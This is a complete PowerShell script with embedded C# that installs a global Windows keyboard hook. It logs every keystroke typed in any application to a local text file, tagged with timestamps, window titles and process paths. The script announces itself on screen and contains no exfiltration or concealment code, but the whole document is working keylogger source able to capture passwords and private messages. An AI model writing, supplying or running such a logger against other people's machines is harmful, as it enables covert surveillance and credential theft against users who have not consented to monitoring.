$Host.UI.RawUI.WindowTitle = "Keyboard Logger (File Output)"
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$csharp = @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;

public class KeyTester {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    private static HookProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static IntPtr _lastWindow = IntPtr.Zero;
    
    private static byte[] _keyState = new byte[256];
    private static StringBuilder _titleBld = new StringBuilder(512);
    private static StringBuilder _pathBld = new StringBuilder(1024);
    private static StringBuilder _charBld = new StringBuilder(10);
    
    private static StreamWriter _writer;
    private static string _logFilePath = "keyboard_log.txt";

    [StructLayout(LayoutKind.Sequential)]
    public struct MSG {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public int pt_x;
        public int pt_y;
    }

    public static void Start() {
        Console.CancelKeyPress += (s, e) => {
            e.Cancel = true;
            Unhook();
            Environment.Exit(0);
        };

        try {
            _writer = new StreamWriter(_logFilePath, true, new UTF8Encoding(true));
            _writer.AutoFlush = true;
        } catch (Exception ex) {
            Console.WriteLine("Init Error: " + ex.Message);
            return;
        }

        _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(null), 0);
        if (_hookID == IntPtr.Zero) {
            Console.WriteLine("Failed to install keyboard hook. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) {
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
        
        Unhook();
    }

    private static void Unhook() {
        if (_hookID != IntPtr.Zero) {
            UnhookWindowsHookEx(_hookID);
            _hookID = IntPtr.Zero;
        }
        if (_writer != null) {
            _writer.Close();
            _writer = null;
        }
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            int scanCode = Marshal.ReadInt32(lParam, 8);
            IntPtr fgWindow = GetForegroundWindow();

            if (fgWindow != _lastWindow) {
                _lastWindow = fgWindow;
                
                uint procId;
                GetWindowThreadProcessId(fgWindow, out procId);

                _pathBld.Length = 0;
                IntPtr hProc = OpenProcess(0x1000, false, procId);
                if (hProc != IntPtr.Zero) {
                    uint size = (uint)_pathBld.Capacity;
                    QueryFullProcessImageName(hProc, 0, _pathBld, ref size);
                    CloseHandle(hProc);
                }
                
                string path = _pathBld.Length > 0 ? _pathBld.ToString() : "Unknown";

                _titleBld.Length = 0;
                GetWindowText(fgWindow, _titleBld, _titleBld.Capacity);

                string timestamp = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
                _writer.WriteLine(string.Format("\n\n--- [{0}] [Path: {1} | Title: {2}] ---", timestamp, path, _titleBld.ToString()));
            }

            if (vkCode == 0x0D) {
                bool isShift = (GetAsyncKeyState(0x10) & 0x8000) != 0;
                _writer.Write(isShift ? " [Shift+Enter]\n\t" : " [Enter]\n");
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            if (vkCode == 0x08) {
                _writer.Write("[BS]");
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            if (vkCode == 0x20) {
                _writer.Write(" ");
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }

            GetKeyboardState(_keyState);
            _keyState[0x10] = (byte)((GetAsyncKeyState(0x10) & 0x8000) != 0 ? 0x80 : 0);
            _keyState[0x11] = (byte)((GetAsyncKeyState(0x11) & 0x8000) != 0 ? 0x80 : 0);
            _keyState[0x12] = (byte)((GetAsyncKeyState(0x12) & 0x8000) != 0 ? 0x80 : 0);
            _keyState[0x14] = (byte)(GetKeyState(0x14) & 0x0001); 

            uint threadId = GetWindowThreadProcessId(fgWindow, IntPtr.Zero);
            IntPtr hkl = GetKeyboardLayout(threadId);

            if (((int)(long)hkl & 0xFFFF) == 0x040D) {
                _keyState[0x14] = 0;
            }

            _charBld.Length = 0;
            if (ToUnicodeEx((uint)vkCode, (uint)scanCode, _keyState, _charBld, _charBld.Capacity, 0, hkl) > 0) {
                if (_charBld.Length > 0 && _charBld[0] >= 32) {
                    _writer.Write(_charBld[0]);
                }
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern sbyte GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
    
    [DllImport("user32.dll")]
    private static extern bool TranslateMessage([In] ref MSG lpMsg);
    
    [DllImport("user32.dll")]
    private static extern IntPtr DispatchMessage([In] ref MSG lpMsg);
    
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
    
    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);
    
    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);
    
    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();
    
    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
    
    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);
    
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    
    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);
    
    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, 
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool QueryFullProcessImageName(IntPtr hProcess, uint dwFlags, StringBuilder lpExeName, ref uint lpdwSize);
    
    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);
}
"@

try {
    Add-Type -TypeDefinition $csharp -ErrorAction Stop
} catch {
    Write-Host "Failed to compile KeyTester class:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Yellow
    if ($_.Exception.InnerException) {
        Write-Host $_.Exception.InnerException.ToString() -ForegroundColor Yellow
    }
    return
}

if (-not ('KeyTester' -as [type])) {
    Write-Host "Type KeyTester still not found after Add-Type." -ForegroundColor Red
    return
}

Clear-Host
Write-Host "Running... Key logs are being saved to keyboard_log.txt" -ForegroundColor Green
Write-Host "Press Ctrl+C to stop cleanly." -ForegroundColor Gray
[KeyTester]::Start()
